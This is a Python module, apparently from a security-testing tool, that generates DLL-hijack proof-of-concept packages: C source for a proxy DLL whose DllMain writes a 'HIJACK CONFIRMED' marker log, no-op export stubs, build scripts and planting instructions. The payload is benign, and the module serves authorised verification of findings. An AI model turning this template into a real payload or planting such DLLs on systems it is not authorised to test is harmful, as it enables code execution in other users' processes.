"""
DLL-hijack proof-of-concept generator.

Turns a phantom/hijackable-DLL finding into an actual, ready-to-compile
test case — the same practical approach tools like DLLSpy/Robber use to
let an analyst *prove* a hijack is exploitable rather than just asserting
it from static analysis:

  1. A minimal C source file for a proxy DLL matching the exact export
     surface the target binary actually calls (from PEInfo.imported_functions
     — no guessing), so the process doesn't immediately crash from a
     missing entry point when it loads the planted DLL.
  2. A benign DllMain that writes an unambiguous, timestamped marker to
     a log file when loaded — this is the actual proof: if the marker
     file appears after launching the target, the hijack is real and
     exploitable, not just theoretically possible.
  3. A ready-to-run build script (MinGW and MSVC variants — whichever is
     on the analyst's PATH) that compiles the DLL with the correct exact
     filename and bitness.
  4. Step-by-step usage instructions tying it together.

Every exported stub is a no-op that returns 0 — this generates a passive
detection marker, not a working exploit payload. It proves the DLL search
order will load an attacker-controlled file; it does not weaponize that
fact.
"""
from __future__ import annotations

import re

# A conservative cap: some binaries import hundreds of functions from a
# single DLL (e.g. a large helper library) — stubbing all of them makes
# for an unwieldy PoC file for marginal benefit, since demonstrating the
# load itself only needs the DllMain marker to fire. Capped, not omitted
# entirely, so the common case (an app calling a handful of specific
# functions from the phantom DLL) still gets a PoC that won't crash on load.
MAX_STUBBED_EXPORTS = 25

_VALID_C_IDENTIFIER_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")


def _safe_dll_basename(dll_name: str) -> str:
    """Best-effort sanitization so a weird/malformed import-table string
    can't be used to break out of the generated filename context."""
    name = re.sub(r"[^A-Za-z0-9_.\-]", "_", dll_name)
    return name or "hijack_poc.dll"


def _c_safe_exports(export_names: list[str]) -> list[str]:
    """Only stub exports that are valid, ordinary C identifiers — ordinal-
    only imports (no name) or decorated/mangled names aren't things we can
    safely re-export as a plain C function stub, and silently skipping
    them is safer than generating C that won't compile."""
    return [n for n in export_names if _VALID_C_IDENTIFIER_RE.match(n)][:MAX_STUBBED_EXPORTS]


def generate_hijack_poc_c_source(dll_name: str, export_names: list[str] | None = None) -> str:
    """Generate C source for a benign proxy/marker DLL matching `dll_name`.

    Loading it (DllMain / DLL_PROCESS_ATTACH) appends a timestamped,
    unambiguous marker line to `%TEMP%\\warden_dll_hijack_poc.log` —
    that log entry appearing after launching the target binary IS the
    proof the hijack is real, not just theoretically possible from static
    analysis alone.

    If `export_names` is given, each valid-identifier export the target
    binary actually calls (from the import table — not a guess) is
    stubbed as a no-op returning 0, so the target doesn't immediately
    crash from a missing entry point when GetProcAddress is called
    against the planted DLL.
    """
    safe_exports = _c_safe_exports(export_names or [])

    export_defs = "\n".join(
        f'__declspec(dllexport) int {name}(void) {{ return 0; }}'
        for name in safe_exports
    )
    if not export_defs:
        export_defs = (
            "/* No importable-by-name exports were recorded for this DLL in the\n"
            "   target's import table (it may only reference this DLL by ordinal,\n"
            "   or the import failed to resolve any named functions during static\n"
            "   analysis). If the target crashes on load because it expects a\n"
            "   specific export, add a matching stub here manually. */"
        )

    return f'''/*
 * Warden DLL-hijack proof-of-concept — {dll_name}
 *
 * Purpose: prove the DLL search order will load an attacker-controlled
 * file with this exact name, by planting this benign stub and confirming
 * it actually loads. This is a DETECTION MARKER, not an exploit payload:
 * every exported function is a no-op that returns 0, and DllMain only
 * writes a log line.
 *
 * Build (see build script generated alongside this file), then copy the
 * resulting DLL to the target directory identified in the finding and
 * launch the target application normally. Check
 * %TEMP%\\warden_dll_hijack_poc.log afterward — a new line naming this
 * DLL confirms the hijack is real and exploitable, not just theoretical.
 *
 * Remove the planted DLL after testing.
 */
#include <windows.h>
#include <stdio.h>

static void write_marker(void) {{
    char path[MAX_PATH];
    char exe_path[MAX_PATH];
    GetTempPathA(MAX_PATH, path);
    strcat_s(path, MAX_PATH, "warden_dll_hijack_poc.log");
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);

    FILE *f = fopen(path, "a");
    if (f) {{
        SYSTEMTIME st;
        GetLocalTime(&st);
        fprintf(f, "[%04d-%02d-%02d %02d:%02d:%02d] HIJACK CONFIRMED: '{dll_name}' loaded "
                    "by process '%s' (PID %lu)\\n",
                st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond,
                exe_path, GetCurrentProcessId());
        fclose(f);
    }}
}}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {{
    if (reason == DLL_PROCESS_ATTACH) {{
        write_marker();
    }}
    return TRUE;
}}

/* ---- Stubbed exports the target binary actually imports by name ---- */
{export_defs}
'''


def generate_build_script(dll_name: str, is_64bit: bool) -> str:
    """Ready-to-run build commands for both common Windows toolchains —
    whichever the analyst has on PATH. Filename and architecture are set
    to match the target exactly (a hijack DLL only works if both match)."""
    safe_name = _safe_dll_basename(dll_name)
    arch_mingw = "x86_64-w64-mingw32-gcc" if is_64bit else "i686-w64-mingw32-gcc"
    msvc_arch = "x64" if is_64bit else "x86"

    return f'''@echo off
REM Warden DLL-hijack PoC build script for {dll_name}
REM Run whichever section matches the compiler you have installed.

REM --- Option A: MinGW-w64 (if gcc is on PATH) ---
{arch_mingw} -shared -o {safe_name} hijack_poc.c
if %ERRORLEVEL% EQU 0 (
    echo Built {safe_name} with MinGW.
    goto :done
)

REM --- Option B: MSVC Developer Command Prompt (if cl.exe is on PATH) ---
REM Run this from an "x64 Native Tools" or "x86 Native Tools" prompt
REM matching the target's architecture ({msvc_arch}):
cl.exe /LD hijack_poc.c /Fe:{safe_name}

:done
echo.
echo Next steps:
echo   1. Copy {safe_name} to the directory identified in the finding
echo      (the exact filename must match - Windows only resolves by name).
echo   2. Launch the target application normally.
echo   3. Check %TEMP%\\warden_dll_hijack_poc.log for a new "HIJACK CONFIRMED" line.
echo   4. Remove the planted DLL once testing is complete.
'''


def build_hijack_poc_text(dll_name: str, export_names: list[str] | None, is_64bit: bool) -> str:
    """Assembles the full PoC package (usage steps + C source + build
    script) as a single text block for the Finding.poc field — consistent
    with how other modules already embed ready-to-run commands inline
    rather than as separate exported files."""
    c_source = generate_hijack_poc_c_source(dll_name, export_names)
    build_script = generate_build_script(dll_name, is_64bit)
    export_note = (
        f"Stubbing {len(_c_safe_exports(export_names or []))} function(s) this binary "
        f"actually imports from '{dll_name}', so it won't crash on a missing entry point."
        if export_names else
        "No named function imports were recorded for this DLL — the PoC only proves the "
        "load itself (DllMain marker); add export stubs manually if the target still "
        "crashes after the planted DLL loads."
    )

    return f'''1. Confirm the import is genuinely unresolved on a real target install
   (not just missing from this static-analysis machine): copy the
   application to a clean Windows VM matching the target's OS build, run
   Process Monitor (procmon.exe) filtered to Process Name = the target
   binary and Operation = "Load Image", and look for a "NAME NOT FOUND"
   result for '{dll_name}'.

2. Build the included proof-of-concept DLL ({export_note})

--- hijack_poc.c ---
{c_source}
--- end hijack_poc.c ---

--- build.bat ---
{build_script}
--- end build.bat ---

3. Place the built DLL (exact filename: {dll_name}) in a directory
   searched before the location where the real DLL, if any, would
   legitimately reside — typically the application's own directory or
   the process's current working directory, per the default DLL search
   order.

4. Launch the target application and check
   %TEMP%\\warden_dll_hijack_poc.log for a "HIJACK CONFIRMED" line naming
   '{dll_name}' — that confirms code execution in this process's context
   via the missing/hijackable dependency.

5. Remove the planted DLL after testing.
'''
